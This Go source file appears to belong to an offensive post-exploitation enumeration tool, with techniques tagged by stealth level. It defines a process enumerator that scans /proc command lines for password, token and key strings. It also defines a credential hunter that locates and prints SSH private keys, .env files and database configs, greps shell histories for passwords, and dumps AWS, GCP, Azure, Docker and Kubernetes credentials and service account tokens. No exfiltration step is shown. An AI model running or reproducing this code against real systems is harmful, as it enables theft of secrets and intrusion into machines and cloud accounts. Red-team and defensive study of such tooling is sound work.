package techniques

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

type ProcessEnum struct{}

func NewProcessEnum() Technique       { return &ProcessEnum{} }
func (p *ProcessEnum) Name() string         { return "Process Enumeration" }
func (p *ProcessEnum) Description() string  { return "Running procs, cmdlines, interesting services, open files" }
func (p *ProcessEnum) StealthLevel() string { return "passive" }

func (p *ProcessEnum) Run() string {
	var b strings.Builder

	b.WriteString("[+] RUNNING PROCESSES (full cmdline)\n")
	b.WriteString(cmd("ps auxwww 2>/dev/null"))
	b.WriteString("\n")

	b.WriteString("[+] PROCESS TREE\n")
	b.WriteString(cmd("pstree -p 2>/dev/null || ps -ejH 2>/dev/null"))
	b.WriteString("\n")

	b.WriteString("[+] PROCESSES RUNNING AS ROOT\n")
	b.WriteString(cmd("ps aux 2>/dev/null | awk '$1==\"root\"{print}'"))
	b.WriteString("\n")

	b.WriteString("[+] PROCESSES RUNNING AS OTHER USERS\n")
	b.WriteString(cmd("ps aux 2>/dev/null | awk '$1!=\"root\" && $1!=\"USER\"{print}' | sort -k1"))
	b.WriteString("\n")

	b.WriteString("[+] INTERESTING PROCESS CMDLINES FROM /proc\n")
	interesting := []string{
		"pass", "password", "secret", "token", "key", "api", "auth",
		"config", "credential", "cred", "mysql", "postgres", "mongo",
		"redis", "memcache", "ssh", "vpn", "priv",
	}
	b.WriteString(readProcCmdlines(interesting))
	b.WriteString("\n")

	b.WriteString("[+] OPEN FILES / SOCKETS (lsof)\n")
	b.WriteString(cmd("lsof -i 2>/dev/null | head -50"))
	b.WriteString("\n")

	b.WriteString("[+] MEMORY MAPPED REGIONS (check for interesting libs)\n")
	b.WriteString(cmd("cat /proc/1/maps 2>/dev/null | grep -v '00000000' | head -30"))
	b.WriteString("\n")

	b.WriteString("[+] DBUS / IPC\n")
	b.WriteString(cmd("busctl list 2>/dev/null | head -30"))
	b.WriteString(cmd("qdbus 2>/dev/null | head -20"))
	b.WriteString("\n")

	b.WriteString("[+] SCREEN / TMUX SESSIONS\n")
	b.WriteString(cmd("screen -list 2>/dev/null"))
	b.WriteString(cmd("tmux list-sessions 2>/dev/null"))
	b.WriteString("\n")

	b.WriteString("[+] INTERESTING DATABASES / WEB SERVERS\n")
	b.WriteString(cmd("ps aux 2>/dev/null | grep -E 'mysql|postgres|mongo|redis|nginx|apache|httpd|tomcat|django|flask|gunicorn|node|java' | grep -v grep"))
	b.WriteString("\n")

	return b.String()
}

func readProcCmdlines(keywords []string) string {
	var b strings.Builder
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return "  [cannot read /proc]\n"
	}
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		// only PID directories
		pid := e.Name()
		var dummy int
		if _, err := fmt.Sscanf(pid, "%d", &dummy); err != nil {
			continue
		}
		cmdlineBytes, err := os.ReadFile("/proc/" + pid + "/cmdline")
		if err != nil {
			continue
		}
		// null-separated
		cmdline := strings.ReplaceAll(string(cmdlineBytes), "\x00", " ")
		lower := strings.ToLower(cmdline)
		for _, kw := range keywords {
			if strings.Contains(lower, kw) {
				b.WriteString(fmt.Sprintf("  pid=%-8s %s\n", pid, strings.TrimSpace(cmdline)))
				break
			}
		}
	}
	return b.String()
}

type CredHunter struct{}

func NewCredHunter() Technique        { return &CredHunter{} }
func (c *CredHunter) Name() string         { return "Credential Hunting" }
func (c *CredHunter) Description() string  { return "SSH keys, config files, history, .env, DB creds, tokens" }
func (c *CredHunter) StealthLevel() string { return "low" }

func (c *CredHunter) Run() string {
	var b strings.Builder

	b.WriteString("[+] SSH PRIVATE KEYS\n")
	b.WriteString(cmd("find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'id_dsa' 2>/dev/null | head -30"))
	b.WriteString(cmd("find / -name '*.pem' -o -name '*.key' -o -name '*.ppk' 2>/dev/null | head -20"))
	b.WriteString("\n")

	b.WriteString("[+] .env FILES\n")
	b.WriteString(cmd("find /home /root /var /opt /srv /app /etc -maxdepth 6 -name '.env' -readable 2>/dev/null | head -10 | xargs -I{} sh -c 'echo \"=== {} ===\"; cat {}'"))
	b.WriteString("\n")

	b.WriteString("[+] CONFIG FILES WITH CREDENTIALS\n")
	credFiles := []string{
		"/etc/mysql/my.cnf", "/etc/mysql/mysql.conf.d/mysqld.cnf",
		"/var/lib/mysql/.my.cnf", "~/.my.cnf",
		"/etc/postgresql/*/main/pg_hba.conf",
		"/etc/redis/redis.conf", "/etc/redis.conf",
		"/etc/mongod.conf",
		"/etc/ftp.conf", "/etc/pure-ftpd.conf",
	}
	for _, cf := range credFiles {
		b.WriteString(cmd("cat " + cf + " 2>/dev/null && echo '--- " + cf + " ---'"))
	}
	b.WriteString("\n")

	b.WriteString("[+] GREP FOR PASSWORDS IN CONFIG FILES\n")
	b.WriteString(cmd("grep -rEl --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.php' --include='*.env' --include='*.yml' --include='*.yaml' --include='*.json' --include='*.xml' --include='*.properties' --exclude-dir='.git' --exclude-dir='node_modules' --exclude-dir='vendor' 'password|passwd|secret|apikey|api_key|token|credential' /etc/ /var/www/ /opt/ /srv/ /home/ /root/ 2>/dev/null | head -20"))
	b.WriteString("\n")

	b.WriteString("[+] WEB CONFIG FILES\n")
	b.WriteString(cmd("find /var/www /srv/www /opt /home -name 'wp-config.php' -o -name 'config.php' -o -name 'settings.py' -o -name 'database.yml' -o -name 'application.properties' 2>/dev/null | head -20"))
	b.WriteString(cmd("find / -name 'web.config' -readable 2>/dev/null | head -10"))
	b.WriteString("\n")

	b.WriteString("[+] HISTORY FILES\n")
	histFiles := []string{
		"/root/.bash_history", "/root/.zsh_history",
		"/root/.mysql_history", "/root/.psql_history",
		"/root/.python_history",
	}
	for _, hf := range histFiles {
		data, err := os.ReadFile(hf)
		if err == nil {
			b.WriteString(fmt.Sprintf("  === %s ===\n%s\n", hf, grepPasswordLines(string(data))))
		}
	}
	b.WriteString(cmd("find /home -name '.bash_history' -o -name '.zsh_history' 2>/dev/null | xargs grep -E 'password|passwd|-p |secret|token' 2>/dev/null | head -30"))
	b.WriteString("\n")

	b.WriteString("[+] AWS / CLOUD CREDENTIALS\n")
	b.WriteString(cmd("find / -name 'credentials' -path '*/.aws/*' -readable 2>/dev/null | xargs cat 2>/dev/null"))
	b.WriteString(cmd("find / -name 'config' -path '*/.aws/*' -readable 2>/dev/null | xargs cat 2>/dev/null"))
	b.WriteString(cmd("find / -name 'credentials.json' -readable 2>/dev/null | head -5"))
	b.WriteString(cmd("find / -name '*.json' -path '*google*' -readable 2>/dev/null | head -5"))
	b.WriteString("\n")

	b.WriteString("[+] GCP / AZURE / DOCKER CREDENTIALS\n")
	b.WriteString(cmd("cat ~/.config/gcloud/credentials.db 2>/dev/null | strings | head -20"))
	b.WriteString(cmd("cat ~/.azure/accessTokens.json 2>/dev/null"))
	b.WriteString(cmd("cat ~/.docker/config.json 2>/dev/null"))
	b.WriteString("\n")

	b.WriteString("[+] KUBERNETES CREDENTIALS\n")
	b.WriteString(cmd("cat ~/.kube/config 2>/dev/null"))
	b.WriteString(cmd("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null"))
	b.WriteString("\n")

	b.WriteString("[+] INTERESTING FILES IN /tmp\n")
	b.WriteString(cmd("ls -lart /tmp/ 2>/dev/null"))
	b.WriteString("\n")

	b.WriteString("[+] RECENTLY MODIFIED FILES (last 24h)\n")
	b.WriteString(cmd("find /home /root /tmp /var/tmp /opt /srv -not -path '/proc/*' -not -path '/sys/*' -mtime -1 -readable 2>/dev/null | head -30"))
	b.WriteString("\n")

	return b.String()
}

func grepPasswordLines(content string) string {
	var b strings.Builder
	scanner := bufio.NewScanner(strings.NewReader(content))
	kws := []string{"password", "passwd", "secret", "token", "apikey", "api_key", " -p "}
	for scanner.Scan() {
		line := scanner.Text()
		lower := strings.ToLower(line)
		for _, kw := range kws {
			if strings.Contains(lower, kw) {
				b.WriteString("  " + line + "\n")
				break
			}
		}
	}
	return b.String()
}
